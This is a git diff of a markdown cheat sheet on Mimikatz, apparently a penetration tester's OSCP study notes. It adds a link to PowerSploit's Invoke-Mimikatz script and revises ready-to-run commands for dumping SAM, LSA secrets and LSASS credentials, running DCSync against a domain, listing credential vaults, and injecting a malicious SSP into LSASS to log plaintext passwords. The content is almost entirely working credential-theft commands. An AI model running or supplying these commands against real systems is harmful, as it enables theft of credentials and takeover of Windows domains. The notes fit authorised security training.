@@ -21,6 +21,8 @@ Kiwi module in [a meterpreter in metasploit](metasploit.md) is an adaptation of 
 
 Download from: https://github.com/ParrotSec/mimikatz.git
 
+We also have [Invoke-mimikatz.ps1](https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/refs/heads/master/Exfiltration/Invoke-Mimikatz.ps1) 
+
 ## Basic usage 
 
 
@@ -61,6 +63,8 @@ token::elevate
   
 # Dump local SAM database  
 .\mimikatz.exe "token::elevate" "lsadump::sam" "exit"  
+
+
   
 # Dump LSA secrets  
 .\mimikatz.exe "token::elevate" "lsadump::secrets" "exit"
@@ -92,11 +96,11 @@ token::elevate
 ########################################  
   
 # Inject into LSASS and dump domain credentials  
-.\mimikatz.exe "privilege::debug" "token::elevate" "lsadump::lsa /inject" "exit"  
+.\mimikatz.exe "token::elevate" "lsadump::lsa /inject" "exit"  
   
 # Perform DCSync attack to dump domain credentials remotely  
-.\mimikatz.exe "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"
-.\mimikatz.exe "lsadump::dcsync /domain:corp.com /all" "exit"
+.\mimikatz.exe "token::elevate" "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"
+.\mimikatz.exe  "token::elevate" "lsadump::dcsync /domain:oscp.exam /all" "exit"
 
 ########################################  
 # Pass-the-Hash attack  
@@ -139,10 +143,10 @@ token::elevate
 ########################################  
   
 # Replicate domain credential data from domain controller  
-.\mimikatz.exe "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"
+.\mimikatz.exe  "token::elevate" "lsadump::dcsync /domain:<DomainFQDN> /all" "exit"
 
 # Example  
-.\mimikatz.exe "lsadump::dcsync /domain:corp.com /all" "exit"
+.\mimikatz.exe "token::elevate" "lsadump::dcsync /domain:oscp.exam /all" "exit"
 
 
   
@@ -172,10 +176,10 @@ token::elevate
 ########################################  
   
 # List RDP/TS sessions  
-.\mimikatz.exe "ts::sessions" "exit"  
+.\mimikatz.exe  "token::elevate"  "ts::sessions" "exit"  
   
 # List credential vault entries  
-.\mimikatz.exe "vault::list" "exit"  
+.\mimikatz.exe  "token::elevate" "vault::list" "exit"  
   
   
 ########################################  
@@ -186,7 +190,7 @@ token::elevate
 .\mimikatz.exe "sekurlsa::minidump c:\temp\lsass.dmp" "exit"  
   
 # Load LSASS dump for analysis  
-.\mimikatz.exe "sekurlsa::minidump lsass.dmp" "sekurlsa::logonpasswords" "exit"  
+.\mimikatz.exe "sekurlsa::minidump c:\temp\lsass.dmp" "sekurlsa::logonpasswords" "exit"  
   
   
 ########################################  
@@ -436,6 +440,8 @@ The Mimikatz SSP takes advantage of the fact that a SSP is called with plaintext
 mimikatz.exe
 privilege::debug
 misc::memssp
+
+.\mimikatz.exe "privilege::debug" "misc::memssp" "exit"
 ```
 
 When injecting a SSP into _LSASS_ using Mimikatz, the credentials will be saved in a log file, **C:\Windows\System32\mimilsa.log**.
